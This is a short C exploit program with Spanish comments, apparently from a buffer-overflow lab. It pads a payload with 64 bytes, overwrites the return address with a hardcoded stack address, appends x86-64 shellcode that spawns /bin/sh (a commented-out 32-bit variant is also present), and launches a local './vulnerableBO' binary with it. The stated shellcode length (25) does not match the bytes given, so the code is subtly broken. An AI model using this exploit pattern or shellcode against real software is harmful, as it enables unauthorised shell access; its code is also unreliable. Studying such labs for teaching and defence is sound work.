#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define OFFSET 64 // Tamaño del búfer en el programa vulnerable
#define SHELLCODE_SIZE 25 // Tamaño del shellcode


int main() {
	// Shellcode para ejecutar /bin/sh
	unsigned char shellcode[] =
//	    "\x31\xc0"             // xor    %eax, %eax
//	    "\x50"                 // push   %eax
//	    "\x68\x2f\x2f\x73\x68" // push   $0x68732f2f
//	    "\x68\x2f\x62\x69\x6e" // push   $0x6e69622f
//	    "\x89\xe3"             // mov    %esp, %ebx
//	    "\x50"                 // push   %eax
//	    "\x53"                 // push   %ebx
//	    "\x89\xe1"             // mov    %esp, %ecx
//	    "\xb0\x0b"             // mov    $0xb, %al
//	    "\xcd\x80";            // int    $0x80
	"\x48\x31\xc0"
    "\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    "\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";

    // Dirección de retorno exacta donde se encuentra el shellcode
    unsigned long ret_address = 0x7fffffffe1f8;
    
    // Crear la cadena de ataque
    char payload[OFFSET + sizeof(ret_address) + SHELLCODE_SIZE];
    memset(payload, 'A', OFFSET); // Relleno hasta el offset
    memcpy(payload + OFFSET, &ret_address, sizeof(ret_address)); // Sobrescribir la dirección de retorno
    memcpy(payload + OFFSET + sizeof(ret_address), shellcode, SHELLCODE_SIZE); // Añadir el shellcode
    printf("direccion de shellcode %p\n",&payload);

    // Ejecutar el programa vulnerable con la cadena de ataque como argumento
    char *args[] = {"./vulnerableBO", payload, NULL};
    execve(args[0], args, NULL);

    return 0;
}

